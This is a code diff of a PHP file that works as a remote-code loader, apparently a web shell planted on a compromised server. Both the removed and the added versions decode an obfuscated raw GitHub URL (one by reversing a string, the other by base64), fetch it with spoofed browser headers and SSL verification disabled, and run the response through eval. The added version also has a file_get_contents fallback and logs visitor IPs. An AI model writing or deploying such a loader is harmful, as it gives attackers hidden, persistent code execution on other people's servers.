@@ -1,38 +1,99 @@
 <?php
-$pass = "Lulz1337";
+$encoded_url_1 = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2x1ZmZ5b3BtL29wbS9yZWZzL2hlYWRzL21haW4v';
+$encoded_url_2 = 'My50eHQ=';
+$url = base64_decode($encoded_url_1 . $encoded_url_2);
 
-if (!isset($_GET['p']) || $_GET['p'] !== $pass) {
-    header('HTTP/1.0 404 Not Found');
-    exit;
+function fetchWithCurl($url) {
+    $ch = curl_init();
+    $userAgents = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
+        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
+    ];
+    $headers = [
+        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'Accept-Language: en-US,en;q=0.9',
+        'Accept-Encoding: gzip, deflate, br',
+        'Connection: keep-alive',
+        'Upgrade-Insecure-Requests: 1',
+        'Cache-Control: max-age=0',
+        'TE: Trailers'
+    ];
+    $options = [
+        CURLOPT_URL => $url,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_MAXREDIRS => 5,
+        CURLOPT_TIMEOUT => 30,
+        CURLOPT_CONNECTTIMEOUT => 15,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => 2,
+        CURLOPT_ENCODING => 'gzip, deflate',
+        CURLOPT_USERAGENT => $userAgents[array_rand($userAgents)],
+        CURLOPT_HTTPHEADER => $headers,
+        CURLOPT_REFERER => 'https://www.google.com/',
+        CURLOPT_COOKIEJAR => '/tmp/cookies.txt',
+        CURLOPT_COOKIEFILE => '/tmp/cookies.txt'
+    ];
+    curl_setopt_array($ch, $options);
+    $response = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $error = curl_error($ch);
+    curl_close($ch);
+    return [
+        'success' => ($httpCode === 200 && !empty($response)),
+        'data' => $response,
+        'error' => $error,
+        'code' => $httpCode
+    ];
 }
 
-$z = "php.2/niam/sdaeh/sfer/mpo/mpyfful/moc.tnebnetnocubhtig.war//:sptth";
-$u = strrev($z);
+function cleanCode($code) {
+    $code = str_replace("\xEF\xBB\xBF", '', $code);
+    $code = trim($code);
+    if (!mb_check_encoding($code, 'UTF-8')) {
+        $code = mb_convert_encoding($code, 'UTF-8');
+    }
+    return $code;
+}
 
-echo '<div style="position:fixed;top:10px;right:10px;z-index:9999;background:#1a1a1a;color:#eee;padding:15px;border-radius:8px;border:2px solid #ff0000;font-family:sans-serif;width:280px;">';
-echo '<b style="color:#ff0000;">[ BYPASS MODE ]</b><br>';
+$result = fetchWithCurl($url);
 
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, $u);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-curl_setopt($ch, CURLOPT_TIMEOUT, 20);
-// Menyamar sebagai Browser Chrome di Windows
-curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
-
-$r = curl_exec($ch);
-$info = curl_getinfo($ch);
-curl_close($ch);
-
-if ($r) {
-    echo '<span style="color:#2ecc71;">● Connection Success</span><br>';
-    eval("?>" . $r);
+if ($result['success']) {
+    $remoteCode = $result['data'];
+    $remoteCode = cleanCode($remoteCode);
+    if (strpos($remoteCode, '<?php') === 0 || strpos($remoteCode, '<?=') === 0) {
+        eval('?>' . $remoteCode);
+    } else {
+        eval($remoteCode);
+    }
 } else {
-    echo '<span style="color:#e74c3c;">● Still Blocked by Server</span><br>';
-    echo '<small>HTTP Code: ' . $info['http_code'] . '</small>';
+    echo "<h3>Error: Gagal mengambil kode</h3>";
+    echo "<p>HTTP Code: " . $result['code'] . "</p>";
+    echo "<p>Error: " . htmlspecialchars($result['error']) . "</p>";
+    ini_set('allow_url_fopen', 1);
+    $alternativeCode = @file_get_contents($url);
+    if ($alternativeCode !== false) {
+        echo "<p>Menggunakan metode alternatif...</p>";
+        eval('?>' . $alternativeCode);
+    }
 }
 
-echo '</div>';
+function logExecution($url, $success, $error = '') {
+    $logFile = __DIR__ . '/execution_log.txt';
+    $timestamp = date('Y-m-d H:i:s');
+    $ip = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
+    $logEntry = sprintf(
+        "[%s] IP: %s | URL: %s | Status: %s | Error: %s\n",
+        $timestamp,
+        $ip,
+        $url,
+        $success ? 'SUCCESS' : 'FAILED',
+        $error
+    );
+    @file_put_contents($logFile, $logEntry, FILE_APPEND);
+}
+
+logExecution($url, $result['success'], $result['error']);
 ?>
